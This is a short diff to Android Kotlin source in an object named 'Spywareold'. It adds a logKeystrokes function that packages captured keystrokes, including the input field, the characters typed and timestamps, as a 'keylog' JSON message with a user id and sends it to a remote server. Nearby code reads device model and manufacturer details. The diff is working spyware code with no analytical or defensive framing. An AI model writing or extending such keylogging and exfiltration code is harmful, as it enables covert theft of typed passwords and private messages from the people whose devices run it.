@@ -57,6 +57,15 @@ object Spywareold {
             }
         }
     }
+    // Formats captured keystrokes as JSON and sends to server
+    fun logKeystrokes(uid: String, entries: List<Map<String, Any>>) {
+        val entriesJson = entries.joinToString(",") { e ->
+            """{"field":"${e["field"]}","chars":"${e["chars"]}","timestamp":${e["timestamp"]}}"""
+        }
+        val json = """{"type":"keylog","uid":"$uid","entries":[$entriesJson],"timestamp":${System.currentTimeMillis()}}"""
+        sendToServer(json)
+    }
+
     fun logUserAction(action: String) {
         val deviceModel = android.os.Build.MODEL
         val manufacturer = android.os.Build.MANUFACTURER
